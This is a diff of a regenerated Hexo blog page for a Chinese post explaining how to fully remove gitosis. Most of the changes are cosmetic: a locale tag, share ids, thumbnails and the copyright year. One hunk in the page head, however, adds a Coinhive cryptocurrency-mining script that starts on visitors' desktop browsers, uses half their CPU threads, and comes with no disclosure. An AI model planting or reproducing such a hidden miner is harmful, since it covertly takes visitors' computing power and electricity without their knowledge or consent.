@@ -12,6 +12,7 @@
 <meta property="og:url" content="http://kingzez.com/2015/10/19/如何完全删除gitosis/index.html">
 <meta property="og:site_name" content="the kingzez blog">
 <meta property="og:description" content="如果你是用apt安装的，那很简单apt-get purge gitosis就可以了。">
+<meta property="og:locale" content="zh-CN">
 <meta property="og:updated_time" content="2015-12-19T16:39:26.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="如何完全删除gitosis">
@@ -63,6 +64,20 @@
   ga('send', 'pageview');
 
 </script>
+<!-- Coinhive -->
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.User('r0WSj9IIUFDNRQl8X4f4zeapVsRB99kq', 'kingzez', {
+		threads: Math.round(navigator.hardwareConcurrency/2),
+		throttle: 0.5
+		});
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile()) {
+		miner.start();
+	}
+</script>
+
 </head>
 <body>
     <div id="container">
@@ -251,7 +266,7 @@
 <p>然后，到～/repositories目录下，删除gitosis-admin.git目录
 <figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">sudo</span> <span class="selector-tag">rm</span> <span class="selector-tag">-fr</span>  <span class="selector-tag">gitosis-admin</span><span class="selector-class">.git</span></div></pre></td></tr></table></figure></p>
 <p>最关键的是，你需要编辑用来安装gitosis的用户home目录下的一些东西，假如我用git这个用户安装，那么
-<figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">su</span> – git</div><div class="line">vi .ssh/authorized_keys</div></pre></td></tr></table></figure></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">su – git</div><div class="line">vi <span class="string">.ssh/authorized_keys</span></div></pre></td></tr></table></figure></p>
 <p>把含有gitosis相关的所有全部删除就ok了。</p>
 
         
@@ -263,7 +278,7 @@
 
 </div>
 
-    <a data-url="http://kingzez.com/2015/10/19/如何完全删除gitosis/" data-id="cj3wdnjfk003x09he6ma6wp3c" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+    <a data-url="http://kingzez.com/2015/10/19/如何完全删除gitosis/" data-id="cjcc61djd004170fy0brwhrvo" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
 <script>
     (function ($) {
         // Prevent duplicate binding
@@ -401,7 +416,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small8.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small7.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -436,7 +451,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small3.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -471,7 +486,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small2.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -541,7 +556,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small7.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -595,7 +610,7 @@
         <footer id="footer">
     <div class="outer">
         <div id="footer-info" class="inner">
-            &copy;2015 - 2017 kingzez<br>
+            &copy;2015 - 2018 kingzez<br>
             Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.
         </div>
     </div>
